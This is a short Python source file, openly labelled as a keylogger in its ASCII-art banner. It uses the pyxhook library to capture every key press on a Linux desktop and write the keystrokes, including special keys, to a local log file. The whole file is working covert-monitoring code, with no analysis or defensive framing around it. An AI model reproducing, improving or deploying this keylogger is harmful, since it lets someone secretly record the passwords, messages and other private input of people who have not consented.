#!/usr/bin/python3


import pyxhook

"""
	*--------------------------------------*
	|          Coded by : ViRus06t          |
	|                  R!oXm                |
	*--------------------------------------*
	   _                _    _       _     
	  | |__   __ _  ___| | _| | __ _| |__  
	  | '_ \ / _` |/ __| |/ / |/ _` | '_ \ 
	  | | | | (_| | (__|   <| | (_| | |_) |
	  |_| |_|\__,_|\___|_|\_\_|\__,_|_.__/ 
	
	               Keylogger
	              -----------
"""



log_file='/path/..'

def keypress(event):
	log=open(log_file,'a')
	if event.Key == 'space':
		log.write(' ')
	elif event.Key == 'Return':
		log.write('\n')
	elif len(event.Key) != 1:
		log.write('[ '+event.Key+' ]')
	else:
		log.write(event.Key)

key=pyxhook.HookManager()
key.KeyDown=keypress
key.HookKeyboard()
key.start()
